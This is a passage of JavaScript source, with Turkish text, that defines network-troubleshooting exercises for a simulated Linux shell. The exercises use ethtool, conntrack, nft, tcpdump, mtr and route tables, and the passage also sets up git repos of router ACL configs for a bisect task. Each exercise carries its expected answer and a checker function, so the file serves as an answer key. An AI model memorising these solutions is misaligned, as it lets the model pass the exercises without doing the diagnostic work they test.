    story: "TAC-48544'ü kapatıyorsun. Gece WAN fabric DSL-2'ye geçmiş, orada path MTU küçük ve bkp01 ICMP dinlemiyor, bu upload'ları yavaşlattı. Alarm mail'lerini EGRESS-SMTP kesti, ot-vendor tunnel'ında traffic selector uymuyor, portal sertifikası temiz. Ama backup job'larının daha başlamadan could not resolve ile düşmesinin asıl sebebi neydi?",
    task: 'Gece backup job\'larının fail etmesinin root cause\'unu tek kelimeyle submit et.',
    hint: "bkp-agent dosya sunucusunun adını çözemediği için bağlantı kurmadan düşüyordu. Agent sistem resolver'ı yerine config'deki emekli bir sunucunun adresini kullanıyordu. dns, resolver ya da nameserver kabul edilir.",
    solution: 'submit dns',
    setup: vopB(), check: (sh, c) => vopSub(c, 'dns', 'resolver', 'nameserver', 'dns resolver', 'dns server', 'agent.ini', '192.168.1.99', 'resolver override', 'yanlis dns', 'eski dns') },
], { hint: "Hardening script'inin bıraktığı şeyi düşün, ping geçiyordu ama 8443 timeout veriyordu. Paketi sessizce düşüren katman Linux'un netfilter'ı. iptables, firewall ya da chain adı kabul edilir." });

/* ======================================================================
   Network ops toolkit, ayni A ve B dunyalari
   ====================================================================== */

addVariants('no1', [
  { title: 'DSL bacağı',
    story: "DSL modem'in LAN portu gigabit, ama jump box'ın eth2 bacağında işler yavaş. Kablonun dört çiftinden biri kopuksa gigabit kurulamaz ve link 100'e iner, buna downshift denir. ethtool ile link'in gerçekte hangi hızda kurulduğuna bak.",
    task: 'ethtool ile eth2 interface\'inin Speed değerini bul ve submit et.',
    hint: "`ethtool` interface adı verilince link ayarlarını, yani Speed, Duplex ve autoneg bilgisini gösterir. Supported link modes kartın neyi destekleyebileceğini, Speed ise şu an neyle kurulduğunu söyler, ikisini karıştırma. Sonucu `sudo dmesg` içindeki igb mesajlarıyla da teyit edebilirsin.",
    solution: 'ethtool eth2\nsudo dmesg\nsubmit 100Mb/s',
    setup: vopA(), check: (sh, c) => vopSub(c, '100Mb/s', '100', '100mbps', '100 mb/s', '100mbit', '100 mbps') },
  { title: 'Hız da düşmüş',
    story: "OT switch arıza yüzünden eski bir yedekle değiştirilmiş ve port elle sabitlenmiş. Karşı taraf autoneg yapmayınca bizim taraf parallel detection ile hızı yakalar ama duplex'i half'e düşürür. HMI ekibi her şeyin eskisinden de yavaş olduğunu söylüyor.",
    task: 'ethtool ile eth1 interface\'inin Speed değerini bul ve submit et.',
    hint: "`ethtool eth1` link'in o anki Speed ve Duplex değerini gösterir. Link partner advertised auto-negotiation No ise karşı port elle sabitlenmiştir, parallel detection hızı bulabilir ama duplex'i bilemez ve half seçer. Advertised link modes bizim teklifimizdir, gerçek sonuç değildir.",
    solution: 'ethtool eth1\nsubmit 10Mb/s',
    setup: vopB(), check: (sh, c) => vopSub(c, '10Mb/s', '10', '10mbps', '10 mb/s', '10mbit', '10 mbps') },
], { hint: "`ethtool` interface adı verilince Speed, Duplex ve autoneg durumunu gösterir. Link partner advertised auto-negotiation No ise karşı port elle sabitlenmiştir, bu durumda parallel detection hızı bulur ama duplex'i half seçer. Supported link modes kartın kapasitesidir, Duplex satırı ise o anki gerçek durum." });

addVariants('no2', [
  { title: 'Kablo hatası',
    story: "Downshift varsa kablo sorunu sayaçlara da yansır. Bozuk çift üzerinden gelen frame'lerin checksum'ı tutmaz ve CRC error olarak sayılır. Driver istatistiklerini oku.",
    task: 'eth2 için rx_crc_errors değerini submit et.',
    hint: "`ethtool -S` driver'ın tuttuğu ham NIC sayaçlarını listeler, çıktı uzun olduğu için `grep crc` ile süzmek pratik. Aynı hata toplamı `ip -s link` çıktısında eth2 için RX errors sütununda da görünür. Sayaç boot'tan beri birikir, arttığını görmek için birkaç dakika arayla iki kez bak.",
    solution: 'ethtool -S eth2 | grep crc\nip -s link show eth2\nsubmit 6120',
    setup: vopA(), check: (sh, c) => vopSub(c, '6120') },
  { title: 'Geç çarpışma',
    story: "Half duplex taraf aynı anda gönderip alamaz, karşı taraf full duplex konuşurken çarpışmalar başlar. İlk 64 byte'tan sonra fark edilen çarpışmaya late collision denir ve neredeyse her zaman duplex mismatch belirtisidir.",
    task: 'eth1 için tx_late_collisions değerini submit et.',
    hint: "`ethtool -S eth1` NIC sayaçlarını verir, `grep late` ile ilgili satırı süz. Late collision sadece half duplex tarafta sayılır, full duplex taraf aynı sorunu CRC ve runt olarak görür. `ip -s link` çıktısındaki collsns sütunu toplam çarpışmadır, late olanlar onun bir alt kümesi.",
    solution: 'ethtool -S eth1 | grep late\nip -s link show eth1\nsubmit 2471',
    setup: vopB(), check: (sh, c) => vopSub(c, '2471') },
], { hint: "`ethtool -S` driver'ın ham NIC sayaçlarını listeler, çıktı uzun olduğundan `grep crc` ile süz. Duplex mismatch'te full duplex taraf CRC ve runt, half duplex taraf late collision görür. Aynı toplam `ip -s link` çıktısında eth1 için RX errors sütununda da var." });

addVariants('no3', [
  { title: 'Yeni historian',
    story: "OT VLAN'a historian-02 diye yeni bir collector eklenmiş ama kimse ulaşamıyor. Cihaz ARP'a cevap vermiyorsa L2'de bile yoktur, IP katmanına hiç çıkılmaz. ARP tablosunda cevap gelmeyen entry incomplete, ip neigh'de FAILED görünür. 192.168.2.60 envanterde zaten sökülmüş bir PLC olarak kayıtlı, o eski bir hayalet.",
    task: "ARP tablosunda incomplete görünen yeni cihazın, yani historian-02'nin IP adresini submit et.",
    hint: "`arp -an` ARP cache'ini listeler, `-n` isim çözmeyi kapatır, `-a` BSD tarzı tek satır format verir. Modern karşılığı `ip neigh`, aynı entry'yi FAILED olarak gösterir. incomplete demek ARP request gitti ama reply gelmedi, sorun kablo, VLAN ya da cihazın kendisindedir.",
    solution: 'arp -an\nip neigh\nsubmit 192.168.2.70',
    setup: vopA(), check: (sh, c) => vopSub(c, '192.168.2.70') },
  { title: 'Emekli sunucunun hayaleti',
    story: "Bir şey hâlâ eski branch DC'sine konuşmaya çalışıyor. Jump box o adres için ARP soruyor ama cevap gelmiyor, çünkü sunucu fiziksel olarak sökülmüş. ARP tablosu bunu açıkça gösterir.",
    task: "ARP tablosunda eth0 üzerinde incomplete görünen entry'nin IP adresini submit et.",
    hint: "`arp -an` her entry'yi IP, MAC ve interface ile tek satırda gösterir, `<incomplete>` MAC'i öğrenilemeyen komşudur. `ip neigh` aynı tabloyu FAILED, REACHABLE ya da STALE gibi state'lerle verir. OT VLAN'daki eski PLC entry'si de incomplete, bu yüzden on eth0 kısmına bakarak LAN tarafındakini ayır.",
    solution: 'arp -an\nip neigh\nsubmit 192.168.1.99',
    setup: vopB(), check: (sh, c) => vopSub(c, '192.168.1.99') },
], { hint: "`arp -an` ARP cache'ini isim çözmeden listeler, `<incomplete>` ARP request'e cevap gelmeyen komşudur. Modern karşılığı `ip neigh`, aynı entry'yi FAILED olarak gösterir. Böyle bir cihaza L3'te ulaşmaya çalışmak boşunadır, sorun L2'de ya da cihazın kendisindedir." });

addVariants('no4', [
  { title: 'Runtime ile config',
    story: "Cutover gecesinden beri OT VLAN hub'a çıkamıyor. Router görevi gören bir Linux'ta ilk bakılacak yer kernel'in paket forward etmeye izinli olup olmadığı. sysctl ile çalışan değeri oku, sonra /etc/sysctl.conf ile karşılaştır, ikisi her zaman aynı olmak zorunda değil.",
    task: 'net.ipv4.ip_forward değerini submit et.',
    hint: "`sysctl` kernel parametrelerini noktalı isimle okur, aslında /proc/sys altındaki dosyaya bakar ve noktalar dizin ayırıcısına karşılık gelir. 1 forwarding açık, 0 kapalı demek. `/etc/sysctl.conf` sadece boot'ta uygulanır, orada 1 yazıp çalışan değer 0 ise biri runtime'da `sysctl -w` ile kapatmış demektir.",
    solution: 'sysctl net.ipv4.ip_forward\ncat /etc/sysctl.conf\nsubmit 0',
    setup: sh => { vopNetEnsure(sh, 'A'); vopPut(sh, '/proc/sys/net/ipv4/ip_forward', '0\n'); },
    check: (sh, c) => vopSub(c, '0') },
  { title: 'Dolu tablo',
    story: "Gece yeni bağlantılar rastgele düşmüş, sudo dmesg içinde nf_conntrack table full mesajları var. Conntrack tablosu dolunca kernel yeni flow için entry açamaz ve paketi atar. Biri hardening sırasında tablo boyutunu düşürmüş olabilir.",
    task: 'net.netfilter.nf_conntrack_max değerini sysctl ile oku ve submit et.',
    hint: "`sysctl` parametreyi noktalı adıyla okur, karşılığı /proc/sys/net/netfilter altındaki dosyadır. nf_conntrack_count o anki entry sayısı, max ise üst sınır, ikisi eşitse tablo doludur. `sudo dmesg` ile table full mesajlarını görüp teşhisi doğrula.",
    solution: 'sudo dmesg\nsysctl net.netfilter.nf_conntrack_max\nsysctl net.netfilter.nf_conntrack_count\nsubmit 16384',
    setup: sh => { vopNetEnsure(sh, 'B'); vopPut(sh, '/proc/sys/net/netfilter/nf_conntrack_max', '16384\n'); vopPut(sh, '/proc/sys/net/netfilter/nf_conntrack_count', '16384\n'); },
    check: (sh, c) => vopSub(c, '16384') },
], { hint: "`sysctl` kernel parametresini noktalı adıyla okur, karşılığı /proc/sys altındaki dosyadır ve noktalar dizin ayırıcısına denk gelir. ip_forward 1 ise kernel interface'ler arasında paket taşır, 0 ise router gibi davranmaz. Kalıcı değer `/etc/sysctl.conf` içinde durur." });

addVariants('no5', [
  { title: 'Forward\'u aç',
    story: "ip_forward kapalı, OT VLAN'ın hub'a çıkamamasının sebebi bu. Cutover script'i forwarding'i geçici olarak kapatmış ve geri açmayı unutmuş, sysctl.conf zaten doğru. Reboot beklemeden çalışan kernel'de düzelt. Kernel ayarı yazmak root ister.",
    task: 'net.ipv4.ip_forward parametresini 1 yap.',
    hint: "`sysctl -w` parametreyi çalışan kernel'de anında değiştirir, isim ile değer eşittir işaretiyle ve boşluksuz yazılır. Kernel ayarı yazmak root yetkisi ister, `sudo` olmadan permission denied alırsın. -w ile yapılan değişiklik reboot'ta kaybolur, kalıcı değer sysctl.conf'tan gelir ve `sysctl -p` ile yeniden yüklenebilir.",
    solution: 'sudo sysctl -w net.ipv4.ip_forward=1\nsysctl net.ipv4.ip_forward',
    setup: sh => { vopNetEnsure(sh, 'A'); vopPut(sh, '/proc/sys/net/ipv4/ip_forward', '0\n'); },
    check: sh => (vopText(sh, '/proc/sys/net/ipv4/ip_forward') || '').trim() === '1' },
  { title: 'Tabloyu büyüt',
    story: "Change onayı geldi, conntrack tablosu jump box'ın yüküne göre büyütülecek. Hedef değer 262144. Kernel ayarı yazmak root ister.",
    task: 'net.netfilter.nf_conntrack_max parametresini 262144 yap.',
    hint: "`sysctl -w` değeri çalışan kernel'e anında yazar ve root ister, `sudo` ile çalıştır. Değer sadece rakam olmalı, birim yazılmaz. Her conntrack entry'si birkaç yüz byte RAM tutar, bu yüzden max değeri körlemesine büyütmek yerine bellekle dengelemek gerekir.",
    solution: 'sudo sysctl -w net.netfilter.nf_conntrack_max=262144\nsysctl net.netfilter.nf_conntrack_max',
    setup: sh => { vopNetEnsure(sh, 'B'); vopPut(sh, '/proc/sys/net/netfilter/nf_conntrack_max', '16384\n'); vopPut(sh, '/proc/sys/net/netfilter/nf_conntrack_count', '16384\n'); },
    check: sh => (vopText(sh, '/proc/sys/net/netfilter/nf_conntrack_max') || '').trim() === '262144' },
], { hint: "`sysctl -w` parametreyi çalışan kernel'de anında değiştirir, isim ve değer boşluksuz eşittirle yazılır. Kernel ayarı yazmak root ister, `sudo` olmadan permission denied alırsın. -w ile yapılan değişiklik reboot'ta kaybolur, kalıcılık için sysctl.conf düzenlenip `sysctl -p` ile yüklenir." });

addVariants('no6', [
  { title: 'Saat kayıyor',
    story: "Jump box'ın saati dakikalarca kaymış, log korelasyonu bozuldu. chrony harici bir NTP sunucusuna soruyor ama cevap alamıyor gibi. conntrack tablosu bir flow'un cevap alıp almadığını açıkça gösterir. Okumak root ister.",
    task: "conntrack tablosunda UNREPLIED durumdaki NTP flow'unun dst adresini submit et.",
    hint: "`conntrack -L` kernel'in takip ettiği tüm flow'ları listeler, her satırda önce orijinal yön sonra beklenen cevap yönü yazar. UNREPLIED işareti paket gitti ama karşıdan hiç paket gelmedi demek. Birden fazla UNREPLIED satırı göreceksin, NTP udp 123 kullanır, dport alanına bakıp doğru flow'un ilk dst alanını oku.",
    solution: 'sudo conntrack -L\nsudo conntrack -L | grep UNREPLIED\nsubmit 203.0.113.123',
    setup: vopA(), check: (sh, c) => vopSub(c, '203.0.113.123') },
  { title: 'Yarım kalan SYN',
    story: "Alarm mail'leri gitmiyordu. conntrack tablosu TCP flow'larını state'leriyle gösterir. SYN_SENT ile UNREPLIED birlikte görünüyorsa SYN çıkmış ama SYN-ACK hiç dönmemiş demektir.",
    task: "conntrack tablosunda SYN_SENT durumunda takılı kalmış TCP flow'un dst adresini submit et.",
    hint: "`sudo conntrack -L` flow'ları listeler, TCP satırlarında state alanı da vardır. UNREPLIED tek başına cevap gelmediğini söyler ve UDP satırlarında da çıkar, SYN_SENT ise bir TCP bağlantısının three-way handshake'te takıldığını gösterir. dport alanı hangi servise gidildiğini, ilk dst alanı da hedef adresi verir.",
    solution: 'sudo conntrack -L | grep UNREPLIED\nsudo conntrack -L | grep SYN_SENT\nsubmit 10.50.0.25',
    setup: vopB(), check: (sh, c) => vopSub(c, '10.50.0.25') },
], { hint: "`conntrack -L` kernel'in takip ettiği flow'ları listeler, her satırda önce orijinal yön sonra beklenen cevap yönü yazar. UNREPLIED paket gitti ama karşıdan hiç cevap gelmedi demek. Okumak `sudo` ister, `grep UNREPLIED` ile süz ve ilk dst alanını oku." });

addVariants('no7', [
  { title: 'Container NAT',
    story: "Jump box'ta birkaç docker container çalışıyor ve dışarı çıkarken NAT'lanıyor. Docker bunu nat table'ına kendi masquerade rule'unu ekleyerek yapar. OT VLAN rule'unun yanında bir tane daha var.",
    task: 'nft ruleset\'inde docker bridge için masquerade uygulanan source network\'ü prefix ile birlikte submit et.',
    hint: "`nft list ruleset` tüm table'ları native sözdizimiyle gösterir, okumak bile root ister. nat table'ının POSTROUTING chain'inde ip saddr ile başlayan iki masquerade satırı var. Docker'ın rule'u bridge dışına çıkan trafiği NAT'lar, network'ü `ip -br addr` çıktısındaki docker0 adresinden de doğrulayabilirsin.",
    solution: 'sudo nft list ruleset\nip -br addr\nsubmit 172.17.0.0/16',
    setup: vopA(), check: (sh, c) => vopSub(c, '172.17.0.0/16') },
  { title: 'WireGuard istemcileri',
    story: "Uzaktan bağlanan admin'ler WireGuard ile jump box'a geliyor ve buradan NAT'lanarak dışarı çıkıyor. Bu masquerade rule'u geçen hafta eklendi.",
    task: 'nft ruleset\'inde WireGuard istemcileri için masquerade uygulanan source network\'ü prefix ile birlikte submit et.',
    hint: "`nft list ruleset` root ile çalışır ve nat table'ındaki POSTROUTING rule'larını gösterir. Birden fazla masquerade var, hangisinin WireGuard'a ait olduğunu wg0 interface'inin subnet'iyle eşleştir, `ip -br addr` bunu verir. Cevabı network adresi ve prefix uzunluğuyla birlikte yaz.",
    solution: 'sudo nft list ruleset\nip -br addr\nsubmit 10.8.0.0/24',
    setup: vopB(), check: (sh, c) => vopSub(c, '10.8.0.0/24') },
], { hint: "`nft list ruleset` tüm table'ları nftables'ın native sözdizimiyle gösterir ve root ister. nat table'ındaki POSTROUTING chain'inde ip saddr ile başlayan masquerade satırı kimin NAT'landığını söyler. Cevabı network adresi ve prefix uzunluğuyla birlikte yaz." });

addVariants('no8', [
  { title: 'SMB SYN\'leri',
    story: "historian-syn.pcap eth1 üzerinde, historian SMB share'ine bağlanamazken alınmış. İçinde ARP, ping ve başka TCP trafiği de var. BPF filtresiyle sadece ilgilendiğin paketleri süz. SYN retransmit'leri katlanan aralıklarla gelir, zaman damgalarına da bak.",
    task: 'Capture\'da 445 portuna giden toplam SYN paketi sayısını submit et.',
    hint: "`tcpdump -r` dosyayı okur, sonuna yazdığın BPF ifadesi paketleri süzer, `dst port 445` sadece hedef portu 445 olanları bırakır. Filtreyi tek tırnak içine almak iyi alışkanlık, birden çok kelime tek argument olarak gider. 139'a giden SYN ve RST ayrı bir deneme, onları sayma.",
    solution: "tcpdump -n -r /var/log/captures/TAC-48377/historian-syn.pcap 'dst port 445'\nsubmit " + vopSynCount('/var/log/captures/TAC-48377/historian-syn.pcap', 445),
    setup: vopA(), check: (sh, c) => vopSub(c, vopSynCount('/var/log/captures/TAC-48377/historian-syn.pcap', 445)) },
  { title: 'Alarm SYN\'leri',
    story: "alarm-smtp.pcap jump box'ın eth0'ında alınmış. Alarm mailer önce 25'e deniyor, olmayınca beş dakika bekleyip tekrar deniyor. Araya DNS ve 587 trafiği de karışmış.",
    task: 'Capture\'da 25 portuna giden toplam SYN paketi sayısını submit et.',
    hint: "`tcpdump -n -r` ile dosyayı oku ve `dst port 25` filtresi ver. Sadece port 25 yazarsan kaynak ya da hedef 25 olan her paket gelir, dst eklersen yalnızca hedef yönü kalır. 587'ye giden handshake başarılı, onu sayma, iki ayrı 25 denemesinin bütün SYN'lerini topla.",
    solution: "tcpdump -n -r /var/log/captures/TAC-48544/alarm-smtp.pcap 'dst port 25'\nsubmit " + vopSynCount('/var/log/captures/TAC-48544/alarm-smtp.pcap', 25),
    setup: vopB(), check: (sh, c) => vopSub(c, vopSynCount('/var/log/captures/TAC-48544/alarm-smtp.pcap', 25)) },
], { hint: "`tcpdump -r` capture dosyasını okur, sona eklediğin BPF ifadesi paketleri süzer, `dst port 8443` sadece hedef portu 8443 olanları bırakır. Filtreyi tek tırnak içine almak birden çok kelimeyi tek argument yapar. Aynı seq ile tekrar eden SYN'ler retransmit'tir ve her biri ayrı paket olarak sayılır." });

addVariants('no9', [
  { title: 'Gerçekten ölü mü',
    story: "historian-sync'in kullandığı 198.51.100.53 cevap vermiyordu. mtr ile yolu hop hop incele. Ara hop'taki loss çoğu zaman ICMP rate limit yüzündendir ve sonraki hop'lara taşınmaz. Ama son hop'ta da loss varsa hedef gerçekten cevap vermiyor demektir.",
    task: '198.51.100.53 adresine 5 paketlik mtr raporu al, son hop\'taki Loss yüzdesini tam sayı olarak submit et.',
    hint: "`mtr -r` report modudur, ekranı canlı güncellemek yerine bitince tek rapor basar, `-c` her hop'a kaç paket gideceğini belirler. Loss sütununu yukarıdan aşağı oku, ara hop'taki kayıp son satıra kadar sürmüyorsa önemsizdir. Son satır hedefin kendisidir, asıl cevap oradaki değer.",
    solution: 'mtr -r -c 5 198.51.100.53\nsubmit 100',
    setup: vopA(), check: (sh, c) => vopSub(c, '100', '100%', '100.0', '100.0%') },
  { title: 'Gecikme nerede artıyor',
    story: "Mail relay'e giden yolun nerede yavaşladığını merak ediyorsun. mtr her hop için latency de verir. Branch LAN'da milisaniyenin altında, SD-WAN fabric üzerinden hub'a geçince ise kıta değiştirmiş gibi bir sıçrama beklersin.",
    task: 'mail.corp.lab adresine 5 paketlik mtr raporu al, latency\'nin ilk kez sıçradığı hop\'un IP adresini submit et.',
    hint: "`mtr -r -c 5` her hop'a beş paket yollar ve Avg sütununda ortalama gecikmeyi verir. `-n` eklersen isimler yerine IP'leri görürsün, cevap için bu daha pratik. Sıçrama genelde tunnel'ın başladığı yerdir, sonraki hop'lar o gecikmeyi zaten taşır.",
    solution: 'mtr -r -n -c 5 mail.corp.lab\nsubmit 10.255.0.1',
    setup: vopB(), check: (sh, c) => vopSub(c, '10.255.0.1', 'ams-dc-hub01.sdwan', 'ams-dc-hub01') },
], { hint: "`mtr -r` report modunda çalışır ve bitince tek rapor basar, `-c` her hop'a kaç paket gideceğini belirler. Ara hop'taki loss sonraki satırlara taşınmıyorsa ICMP rate limit'tir, gerçek kayıp değildir. Son satır hedefin kendisi, asıl bakacağın değer orada." });

addVariants('no10', [
  { title: 'Management table',
    story: "Jump box'a WireGuard üzerinden gelen management trafiğinin cevapları da aynı tunnel'dan dönmeli, yoksa asymmetric routing olur ve rp_filter paketi düşürür. Bunun için ayrı bir route table ve source based rule tanımlanmış, adı rt_tables dosyasında.",
    task: "mgmt table'ı içindeki default route'un gateway adresini submit et.",
    hint: "`cat /etc/iproute2/rt_tables` table numaralarını isimlerle eşler, `ip rule` hangi kaynak adresin hangi table'a baktığını gösterir. `ip route show table` ardından isim ya da numara vererek o table'ın içeriğini listelersin. table vermezsen sadece main görünür ve aradığın route orada değildir.",
    solution: 'cat /etc/iproute2/rt_tables\nip rule\nip route show table mgmt\nsubmit 10.8.0.1',
    setup: vopA(), check: (sh, c) => vopSub(c, '10.8.0.1') },
  { title: 'OT policy route',
    story: "OT VLAN'dan gelen trafik hub'a gitmeden önce ayrı bir OT firewall'dan geçmek zorunda, bu bir IEC 62443 gereği. Jump box bunu policy routing ile yapıyor, eth1'den giren OT trafiği ayrı bir table'a bakıyor.",
    task: "ot table'ı içindeki default route'un gateway adresini submit et.",
    hint: "`ip rule` çıktısındaki from 192.168.2.0/24 iif eth1 satırı OT trafiğinin hangi table'a yönlendiğini söyler. `ip route show table` ile o table'ı isim ya da numarasıyla listele. iif şartı sadece eth1'den giren paketleri seçer, jump box'ın kendi ürettiği trafik bu rule'a takılmaz.",
    solution: 'ip rule\ncat /etc/iproute2/rt_tables\nip route show table ot\nsubmit 192.168.2.254',
    setup: vopB(), check: (sh, c) => vopSub(c, '192.168.2.254') },
], { hint: "`ip route show table` ardından isim ya da numara verince o route table'ın içeriği listelenir, table vermezsen sadece main görünür. Table isimleri `/etc/iproute2/rt_tables` dosyasından gelir, 100 ile dsl aynı table. Cevap default via satırındaki adres." });

/* ======================================================================
   Git. Varyant 1 ~/edge-acl, varyant 2 ~/dc-fabric. G_API.createRepo ile kurulur
   ====================================================================== */

const VOP_CAN = ['Can Öztürk', 'can@netlab.local'];
const VOP_ELIF = ['Elif Şahin', 'elif@netlab.local'];
const VOP_ME = ['Burak Dartar', 'burak@netlab.local'];

/* edge ACL sablonu */
function vopAcl(host, city, ip, isp) {
  return [
    `! ${host}, ${city} branch internet edge`, '! platform ISR1100, IOS-XE 17.9', 'ip access-list extended WAN-IN',
    ' remark --- IPsec to hub ams-dc-hub01 ---',
    ` permit udp host 198.51.100.10 host ${ip} eq 500`, ` permit udp host 198.51.100.10 host ${ip} eq 4500`, ` permit esp host 198.51.100.10 host ${ip}`,
    ' remark --- management ---', ` permit tcp 10.0.50.0 0.0.0.255 host ${ip} eq 22`, ` permit udp host 10.0.50.20 host ${ip} eq snmp`,
    ' remark --- default ---', ' deny   ip any any log', '!',
    'interface GigabitEthernet0/0/0', ` description WAN ${isp}`, ` ip address ${ip} 255.255.255.252`, ' ip access-group WAN-IN in', '!', 'end',
  ].join('\n') + '\n';
}
const VOP_ACL = {
  ist: vopAcl('edge-ist-01', 'Istanbul Maslak', '203.0.113.62', 'Turk Telekom fiber TR-IST-7731'),
  izm: vopAcl('edge-izm-02', 'Izmir Alsancak', '203.0.113.66', 'Turkcell fiber TR-IZM-5521, CGNAT arkasinda'),
  ank: vopAcl('edge-ank-03', 'Ankara Cankaya', '203.0.113.70', 'Vodafone fiber TR-ANK-1180'),
};
VOP_ACL.readme = "# edge-acl\n\nBranch internet edge router'larinin inbound ACL'leri.\nHer router icin bir dosya, dosya adi hostname ile ayni.\n\n- edge-ist-01.acl, Istanbul Maslak\n- edge-izm-02.acl, Izmir Alsancak\n- edge-ank-03.acl, Ankara Cankaya\n- check-acl.sh, push oncesi IPsec policy kontrolu\n";
VOP_ACL.check = [
  '#!/bin/bash',
  "# Edge ACL policy: IKE (udp 500) ve NAT-T (udp 4500) hicbir edge ACL'de deny edilmez",
  '# Ihlal varsa exit 1 doner, git bisect run bu script ile calisabilir',
  'if grep -n "deny.*udp.* eq 500\\|deny.*udp.* eq 4500" edge-*.acl; then',
  '  echo "FAIL: IPsec control plane blocked"',
  '  exit 1',
  'fi',
  'echo "OK: edge ACL policy"',
].join('\n') + '\n';

/* NX-OS leaf sablonu */
function vopLeaf(n, rack) {
  return [
    `! leaf-0${n}, Amsterdam DC rack ${rack} ToR`, '! platform Nexus 93180YC-FX, NX-OS 10.3', `hostname leaf-0${n}`, '!',
    'feature bgp', 'feature nv overlay', 'feature vn-segment-vlan-based', 'nv overlay evpn', '!',
    'vlan 110', '  vn-segment 10110', 'vlan 120', '  vn-segment 10120', '!',
    'interface loopback0', `  ip address 10.255.1.1${n}/32`, '!',
    'interface nve1', '  no shutdown', '  host-reachability protocol bgp', '  source-interface loopback0',
    '  member vni 10110', '    ingress-replication protocol bgp', '  member vni 10120', '    ingress-replication protocol bgp', '!',
    'router bgp 65100', `  router-id 10.255.1.1${n}`, '  neighbor 10.255.1.1', '    remote-as 65100', '    description spine-01', '    update-source loopback0',
    '    address-family l2vpn evpn', '      send-community extended', '!', 'end',
  ].join('\n') + '\n';
}
const VOP_FAB = { l1: vopLeaf(1, 'A01'), l2: vopLeaf(2, 'A02'), l3: vopLeaf(3, 'B01') };
VOP_FAB.spine = [
  '! spine-01, Amsterdam DC spine ve EVPN route reflector', '! platform Nexus 9336C-FX2, NX-OS 10.3', 'hostname spine-01', '!',
  'feature bgp', 'nv overlay evpn', '!', 'interface loopback0', '  ip address 10.255.1.1/32', '!',
  'router bgp 65100', '  router-id 10.255.1.1', '  maximum-paths ibgp 2', '  template peer LEAF', '    remote-as 65100', '    update-source loopback0',
  '    address-family l2vpn evpn', '      send-community extended', '      route-reflector-client',
  '  neighbor 10.255.1.11', '    inherit peer LEAF', '    description leaf-01',
  '  neighbor 10.255.1.12', '    inherit peer LEAF', '    description leaf-02',
  '  neighbor 10.255.1.13', '    inherit peer LEAF', '    description leaf-03', '!', 'end',
].join('\n') + '\n';
VOP_FAB.readme = "# dc-fabric\n\nAmsterdam DC VXLAN EVPN fabric config'leri, NX-OS.\nHer switch icin bir dosya, dosya adi hostname ile ayni.\n\n- spine-01.conf, spine ve route reflector\n- leaf-01..03.conf, ToR leaf'ler\n- check-fabric.sh, push oncesi BGP peering kontrolu\n";
VOP_FAB.check = [
  '#!/bin/bash',
  "# Fabric policy: leaf'ler spine'a her zaman AS 65100 ile peer olur (iBGP, spine route reflector)",
  '# Ihlal varsa exit 1 doner, git bisect run bu script ile calisabilir',
  'if grep -n "remote-as" leaf-*.conf | grep -v "remote-as 65100"; then',
  '  echo "FAIL: spine peering AS mismatch"',
  '  exit 1',
  'fi',
  'echo "OK: fabric BGP policy"',
].join('\n') + '\n';

/* Commit listesi createRepo formatinda. Dosya surumleri bir oncekinden turetilir */
function vopGitBuild(steps) {
  const cur = {}; const out = [];
  for (const s of steps) {
    const files = {};
    Object.keys(s.set).forEach(k => { const v = typeof s.set[k] === 'function' ? s.set[k](cur[k]) : s.set[k]; files[k] = v; cur[k] = v; });
    out.push(Object.assign({ msg: s.m, author: s.a, date: s.d, files }, s.tag ? { tag: s.tag } : {}));
  }
  return out;
}
/* ext-git.js gitNewCommit ile ayni deterministik hash, cozumlerde gercek hash'i yazabilmek icin */
function vopGitHashes(commits) {
  const out = []; const seen = new Set(); let files = {}; let tip = null;
  for (const c of commits) {
    files = Object.assign({}, files);
    Object.keys(c.files || {}).forEach(k => { if (c.files[k] === null) delete files[k]; else files[k] = c.files[k]; });
    const snap = {}; Object.keys(files).sort().forEach(k => { if (files[k] !== undefined && files[k] !== null) snap[k] = files[k]; });
    let short = gitHex((tip ? [tip] : []).join(',') + '|' + c.msg + '|' + G_API.person(c.author)[0] + '|' + JSON.stringify(snap), 7);
    while (seen.has(short) || !/[a-f]/.test(short)) short = gitHex(short + 'x', 7);
    seen.add(short); out.push(short); tip = short;
  }
  return out;
}

const VOP_GIT = {
  a: {
    root: VOP_H + '/edge-acl', remote: 'https://git.netlab.local/netops/edge-acl.git', tag: 'v2.3', script: './check-acl.sh',
    file: 'edge-izm-02.acl', dirtyFile: 'edge-ank-03.acl', notesFile: 'izm-outage-notes.txt',
    badMsg: 'edge-izm-02: drop NAT-T scan noise from the internet', author: 'Mehmet Demir',
    commits: vopGitBuild([
      { a: 'burak', d: '2026-09-20T09:10:12+02:00', m: 'Initial commit: edge ACL repo', set: { 'README.md': VOP_ACL.readme, '.gitignore': '*.bak\n*.log\n*.swp\n' } },
      { a: 'burak', d: '2026-09-20T11:42:30+02:00', m: 'Add IPsec control plane policy check', set: { 'check-acl.sh': VOP_ACL.check } },
      { a: 'ayse', d: '2026-09-22T14:05:51+02:00', m: 'Add edge-ist-01 inbound ACL', set: { 'edge-ist-01.acl': VOP_ACL.ist } },
      { a: 'mehmet', d: '2026-09-23T10:31:07+02:00', m: 'Add edge-izm-02 inbound ACL', set: { 'edge-izm-02.acl': VOP_ACL.izm } },
      { a: VOP_CAN, d: '2026-09-25T16:20:44+02:00', m: 'Add edge-ank-03 inbound ACL', set: { 'edge-ank-03.acl': VOP_ACL.ank } },
      { a: 'ayse', d: '2026-09-30T13:12:09+02:00', m: 'edge-ist-01: allow new SNMP collector 10.0.60.30', tag: 'v2.3', set: { 'edge-ist-01.acl': t => t.replace(' permit udp host 10.0.50.20 host 203.0.113.62 eq snmp\n', ' permit udp host 10.0.50.20 host 203.0.113.62 eq snmp\n permit udp host 10.0.60.30 host 203.0.113.62 eq snmp\n') } },
      { a: 'burak', d: '2026-10-03T09:48:26+02:00', m: 'edge-ank-03: restrict SSH to the jump host', set: { 'edge-ank-03.acl': t => t.replace(' permit tcp 10.0.50.0 0.0.0.255 host 203.0.113.70 eq 22\n', ' permit tcp host 10.0.50.10 host 203.0.113.70 eq 22\n') } },
      { a: 'mehmet', d: '2026-10-08T17:55:40+02:00', m: 'edge-izm-02: drop NAT-T scan noise from the internet', set: { 'edge-izm-02.acl': t => t.replace(' permit udp host 198.51.100.10 host 203.0.113.66 eq 4500\n', ' deny   udp any host 203.0.113.66 eq 4500 log\n') } },
      { a: VOP_CAN, d: '2026-10-10T11:03:18+02:00', m: 'edge-ist-01: add CAB reference to management remark', set: { 'edge-ist-01.acl': t => t.replace(' remark --- management ---\n', ' remark --- management, CAB-2291 ---\n') } },
